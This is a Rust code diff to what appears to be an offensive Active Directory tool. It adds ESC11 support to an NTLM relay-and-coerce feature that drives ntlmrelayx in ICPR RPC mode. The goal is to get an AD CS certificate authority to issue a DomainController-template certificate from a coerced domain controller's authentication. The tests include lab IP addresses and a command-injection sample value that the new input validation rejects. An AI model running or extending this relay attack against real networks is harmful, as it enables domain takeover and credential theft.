@@ -236,6 +236,12 @@ struct RelayCoerceConfig {
     /// `Some("rpc://<ca_host>")` for ESC11 (RPC ICPR enrollment) — same
     /// listener+coerce machinery, different target endpoint.
     relay_target_url: Option<String>,
+    /// CA common name for the ESC11 ICPR request (`certipy find` reports it
+    /// as `CA Name`). Required whenever `relay_target_url` is an `rpc://`
+    /// URL: ntlmrelayx binds the ICPR interface only under
+    /// `-rpc-mode ICPR`, and `ICertPassage` needs the CA name to route the
+    /// request. Unused on the ESC8 HTTP path.
+    icpr_ca_name: Option<String>,
 }
 
 #[derive(Debug, Clone, PartialEq, Eq)]
@@ -330,6 +336,23 @@ fn parse_relay_coerce_args(args: &Value) -> Result<RelayCoerceConfig> {
         }
     }
 
+    let icpr_ca_name = optional_str(args, "icpr_ca_name")
+        .map(str::trim)
+        .filter(|s| !s.is_empty());
+    if let Some(name) = icpr_ca_name {
+        if name.contains('\n') || name.contains('\'') {
+            anyhow::bail!("icpr_ca_name contains forbidden character (newline or single-quote)");
+        }
+    }
+    if relay_target_url.is_some_and(|u| u.starts_with("rpc://")) && icpr_ca_name.is_none() {
+        anyhow::bail!(
+            "relay_and_coerce: an rpc:// relay target is an ESC11 ICPR request and requires \
+             'icpr_ca_name' (the CA common name from `certipy find`). Without it ntlmrelayx \
+             relays to the task-scheduler interface instead of ICertPassage and never requests \
+             a certificate."
+        );
+    }
+
     Ok(RelayCoerceConfig {
         ca_host: ca_host.to_string(),
         coerce_target: coerce_target.to_string(),
@@ -339,7 +362,41 @@ fn parse_relay_coerce_args(args: &Value) -> Result<RelayCoerceConfig> {
         coerce_secret,
         template: template.to_string(),
         relay_target_url: relay_target_url.map(String::from),
+        icpr_ca_name: icpr_ca_name.map(String::from),
     })
+}
+
+/// Build the ntlmrelayx argument vector for the relay phase.
+///
+/// An `rpc://` target is an ESC11 ICPR enrollment: ntlmrelayx picks the RPC
+/// interface to bind from `-rpc-mode`, which defaults to `TSCH`, and its TSCH
+/// attack aborts with `No command provided to attack` when no `-c` is given.
+/// Both `-rpc-mode ICPR` and `-icpr-ca-name` are therefore mandatory on that
+/// path; `--template` is read by the ICPR attack the same way the HTTP AD CS
+/// attack reads it. HTTP targets keep the ESC8 argument vector unchanged.
+fn build_relay_args(target_url: &str, template: &str, icpr_ca_name: Option<&str>) -> Vec<String> {
+    let mut args: Vec<String> = vec![
+        "-t".into(),
+        target_url.into(),
+        "--adcs".into(),
+        "--template".into(),
+        template.into(),
+        "-smb2support".into(),
+        "--keep-relaying".into(),
+        "--no-da".into(),
+        "--no-acl".into(),
+        "--no-validate-privs".into(),
+        "--no-dump".into(),
+    ];
+    if target_url.starts_with("rpc://") {
+        if let Some(ca) = icpr_ca_name.map(str::trim).filter(|s| !s.is_empty()) {
+            args.push("-rpc-mode".into());
+            args.push("ICPR".into());
+            args.push("-icpr-ca-name".into());
+            args.push(ca.into());
+        }
+    }
+    args
 }
 
 // === Trait-based execution seam =====================================
@@ -367,6 +424,7 @@ trait CoerceProcs {
         &self,
         target_url: &str,
         template: &str,
+        icpr_ca_name: Option<&str>,
         relay_log: &Path,
         workdir: &Path,
     ) -> Result<Self::Handle>;
@@ -566,6 +624,7 @@ impl CoerceProcs for RealCoerceProcs {
         &self,
         target_url: &str,
         template: &str,
+        icpr_ca_name: Option<&str>,
         relay_log: &Path,
         workdir: &Path,
     ) -> Result<Self::Handle> {
@@ -576,19 +635,7 @@ impl CoerceProcs for RealCoerceProcs {
         // them (and not in the worker's `/`). --keep-relaying prevents the
         // first inbound (often anonymous) connection from causing "All targets
         // processed!" before the real coerced DC calls back.
-        let relay_args: Vec<String> = vec![
-            "-t".into(),
-            target_url.into(),
-            "--adcs".into(),
-            "--template".into(),
-            template.into(),
-            "-smb2support".into(),
-            "--keep-relaying".into(),
-            "--no-da".into(),
-            "--no-acl".into(),
-            "--no-validate-privs".into(),
-            "--no-dump".into(),
-        ];
+        let relay_args: Vec<String> = build_relay_args(target_url, template, icpr_ca_name);
         let redacted_cmd = crate::redact::redact_command_line(RELAY_BIN, &relay_args);
         let span = tracing::info_span!(
             "exec.relay",
@@ -815,7 +862,13 @@ async fn run_relay_and_coerce<P: CoerceProcs>(
         None => format!("http://{}/certsrv/certfnsh.asp", cfg.ca_host),
     };
     let mut relay = procs
-        .spawn_relay(&target_url, &cfg.template, &relay_log, &workdir)
+        .spawn_relay(
+            &target_url,
+            &cfg.template,
+            cfg.icpr_ca_name.as_deref(),
+            &relay_log,
+            &workdir,
+        )
         .await?;
 
     // Give it a moment to bind ports; if it died, surface RELAY_BIND_FAILED.
@@ -1442,10 +1495,91 @@ mod tests {
             "ca_host": "192.168.58.10",
             "coerce_target": "192.168.58.20",
             "attacker_ip": "192.168.58.100",
-            "relay_target_url": "rpc://192.168.58.10"
+            "relay_target_url": "rpc://192.168.58.10",
+            "icpr_ca_name": "contoso-CA01-CA"
         });
         let cfg = super::parse_relay_coerce_args(&args).expect("rpc target should parse");
         assert_eq!(cfg.relay_target_url.as_deref(), Some("rpc://192.168.58.10"));
+        assert_eq!(cfg.icpr_ca_name.as_deref(), Some("contoso-CA01-CA"));
+    }
+
+    #[test]
+    fn parse_relay_coerce_args_rejects_rpc_relay_target_without_ca_name() {
+        let args = json!({
+            "ca_host": "192.168.58.10",
+            "coerce_target": "192.168.58.20",
+            "attacker_ip": "192.168.58.100",
+            "relay_target_url": "rpc://192.168.58.10"
+        });
+        let err = super::parse_relay_coerce_args(&args)
+            .expect_err("an rpc target without a CA name cannot request a certificate");
+        assert!(
+            err.to_string().contains("icpr_ca_name"),
+            "unexpected error: {err}"
+        );
+    }
+
+    #[test]
+    fn parse_relay_coerce_args_ignores_blank_icpr_ca_name_on_http_target() {
+        let args = json!({
+            "ca_host": "192.168.58.10",
+            "coerce_target": "192.168.58.20",
+            "attacker_ip": "192.168.58.100",
+            "icpr_ca_name": "   "
+        });
+        let cfg = super::parse_relay_coerce_args(&args).expect("esc8 args should parse");
+        assert!(cfg.icpr_ca_name.is_none());
+    }
+
+    #[test]
+    fn parse_relay_coerce_args_rejects_shell_metacharacters_in_icpr_ca_name() {
+        let args = json!({
+            "ca_host": "192.168.58.10",
+            "coerce_target": "192.168.58.20",
+            "attacker_ip": "192.168.58.100",
+            "relay_target_url": "rpc://192.168.58.10",
+            "icpr_ca_name": "contoso'`whoami`"
+        });
+        let err =
+            super::parse_relay_coerce_args(&args).expect_err("single-quote should be rejected");
+        assert!(
+            err.to_string().contains("forbidden character"),
+            "unexpected error: {err}"
+        );
+    }
+
+    #[test]
+    fn relay_args_for_http_target_carry_no_rpc_mode() {
+        let args = super::build_relay_args(
+            "http://192.168.58.10/certsrv/certfnsh.asp",
+            "DomainController",
+            None,
+        );
+        assert!(
+            !args.iter().any(|a| a == "-rpc-mode"),
+            "ESC8 argv must stay unchanged: {args:?}"
+        );
+        assert!(args.iter().any(|a| a == "--adcs"));
+    }
+
+    #[test]
+    fn relay_args_for_rpc_target_request_icpr_mode_and_ca_name() {
+        let args = super::build_relay_args(
+            "rpc://192.168.58.10",
+            "DomainController",
+            Some("contoso-CA01-CA"),
+        );
+        let mode = args
+            .iter()
+            .position(|a| a == "-rpc-mode")
+            .expect("rpc target must select an RPC attack mode");
+        assert_eq!(args[mode + 1], "ICPR");
+        let ca = args
+            .iter()
+            .position(|a| a == "-icpr-ca-name")
+            .expect("ICPR request must name the CA");
+        assert_eq!(args[ca + 1], "contoso-CA01-CA");
+        assert!(args.iter().any(|a| a == "--adcs"));
     }
 
     #[test]
@@ -1641,6 +1775,7 @@ mod tests {
             &self,
             _target_url: &str,
             _template: &str,
+            _icpr_ca_name: Option<&str>,
             relay_log: &Path,
             _workdir: &Path,
         ) -> Result<Self::Handle> {
@@ -1740,6 +1875,7 @@ mod tests {
             coerce_secret: None,
             template: "DomainController".into(),
             relay_target_url: None,
+            icpr_ca_name: None,
         }
     }
 
@@ -1755,6 +1891,7 @@ mod tests {
             )),
             template: "DomainController".into(),
             relay_target_url: None,
+            icpr_ca_name: None,
         }
     }
 
